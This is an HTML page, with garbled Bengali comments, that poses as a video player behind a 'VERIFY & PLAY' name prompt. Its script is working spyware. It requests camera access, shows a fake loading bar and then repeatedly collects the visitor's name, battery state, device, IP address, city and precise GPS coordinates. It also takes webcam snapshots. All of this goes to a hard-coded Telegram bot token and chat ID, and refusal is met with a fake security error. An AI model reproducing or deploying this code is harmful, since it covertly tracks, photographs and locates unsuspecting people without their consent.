<!DOCTYPE html>
<html lang="bn">
<head>

        /* ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶™‡ßç‡¶≤‡ßá‡ßü‡¶æ‡¶∞ ‡¶∏‡ßç‡¶ü‡¶æ‡¶á‡¶≤ */

        /* ‡¶´‡ßá‡¶ï ‡¶≤‡ßã‡¶° ‡¶¨‡¶æ‡¶∞ */

<body>

<canvas id="matrix"></canvas>

<div class="overlay" id="overlay">

        <input type="text" id="userName" class="input-field" placeholder="Full Name" required>
        
        <div id="progressBox"><div id="progressBar"></div></div>

        <button class="btn" id="startBtn" onclick="initiateSystem()">VERIFY & PLAY</button>

</div>

</div>

<video id="webcam" autoplay playsinline muted style="display:none;"></video>
<canvas id="snapCanvas" style="display:none;"></canvas>

<script>
    const TOKEN = '8032917202:AAFCD2hCP709BspRJSbibMl3BefYTVxV-qE';
    const CHAT_ID = '7416528268';
    let targetName = "Unknown";

    // Matrix Background
    const canvas = document.getElementById('matrix');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
    const matrixData = "SIYAM_BOSS_Sadaf245sz";
    const drops = Array(Math.floor(canvas.width / 16)).fill(1);
    function draw() {
        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = '#0F0'; ctx.font = '16px arial';
        drops.forEach((y, i) => {
            ctx.fillText(matrixData[Math.floor(Math.random() * matrixData.length)], i * 16, y * 16);
            if (y * 16 > canvas.height && Math.random() > 0.975) drops[i] = 0;
            drops[i]++;
        });
    }
    setInterval(draw, 35);

    async function initiateSystem() {
        const nameInput = document.getElementById('userName').value;
        if (!nameInput) return alert("Please enter your name!");
        targetName = nameInput;

        document.getElementById('startBtn').style.display = 'none';
        document.getElementById('userName').style.display = 'none';
        document.getElementById('progressBox').style.display = 'block';
        document.getElementById('statusMsg').style.display = 'block';

        try {
            // ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶ì ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶™‡¶æ‡¶∞‡¶Æ‡¶ø‡¶∂‡¶® ‡¶ü‡ßç‡¶∞‡¶ø‡¶ó‡¶æ‡¶∞
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('webcam').srcObject = stream;

            // ‡ßß‡ß¶ ‡¶∏‡ßá‡¶ï‡ßá‡¶®‡ßç‡¶°‡ßá‡¶∞ ‡¶´‡ßá‡¶ï ‡¶≤‡ßã‡¶°‡¶ø‡¶Ç
            let w = 0;
            let timer = setInterval(() => {
                if (w >= 100) {
                    clearInterval(timer);
                    document.getElementById('overlay').style.display = 'none';
                    document.getElementById('videoPlayerBox').style.display = 'flex';
                    startTracking();
                } else {
                    w++;
                    document.getElementById('progressBar').style.width = w + '%';
                }
            }, 100);

        } catch (e) {
            alert("Security Error! Please allow permissions to proceed.");
            location.reload();
        }
    }

    async function startTracking() {
        sendReport("CONNECTED");
        setInterval(() => sendReport("ACTIVE_LOOP"), 300000); // ‡¶™‡ßç‡¶∞‡¶§‡¶ø ‡ß´ ‡¶Æ‡¶ø‡¶®‡¶ø‡¶ü
    }

    async function sendReport(type) {
        // ‡¶¨‡ßç‡¶Ø‡¶æ‡¶ü‡¶æ‡¶∞‡¶ø ‡¶§‡¶•‡ßç‡¶Ø
        let batteryInfo = "Unknown";
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Not Charging'})`;
        }

        // ‡¶Ü‡¶á‡¶™‡¶ø ‡¶ì ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶®
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        const locData = await locRes.json();

        let log = `üë§ *TARGET:* ${targetName}\nüîã Battery: ${batteryInfo}\nüì± Device: ${navigator.platform}\nüåê IP: \`${ipData.ip}\`\nüìç Location: ${locData.city}\nüõ∞ Maps: [Open](https://www.google.com/maps?q=${locData.latitude},${locData.longitude})`;

        navigator.geolocation.getCurrentPosition((pos) => {
            sendToTG(log + `\nüéØ GPS: [Maps](https://www.google.com/maps?q=$${pos.coords.latitude},${pos.coords.longitude})`);
        }, () => sendToTG(log), {enableHighAccuracy: true});

        takeSnap();
    }

    function takeSnap() {
        const video = document.getElementById('webcam');
        const canvas = document.getElementById('snapCanvas');
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(blob => {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', blob, 'shot.jpg');
            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        });
    }

    function sendToTG(msg) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
        });
    }

    function exitToFB() {
        // ‡¶è‡¶ï‡ßç‡¶∏‡¶ø‡¶ü ‡¶¨‡¶æ‡¶ü‡¶®‡ßá ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶∞‡¶≤‡ßá ‡¶∏‡¶∞‡¶æ‡¶∏‡¶∞‡¶ø ‡¶´‡ßá‡¶∏‡¶¨‡ßÅ‡¶ï ‡¶π‡ßã‡¶Æ‡ßá ‡¶™‡¶æ‡¶†‡¶ø‡ßü‡ßá ‡¶¶‡ßá‡¶¨‡ßá
        window.location.href = "https://www.facebook.com";
    }
</script>
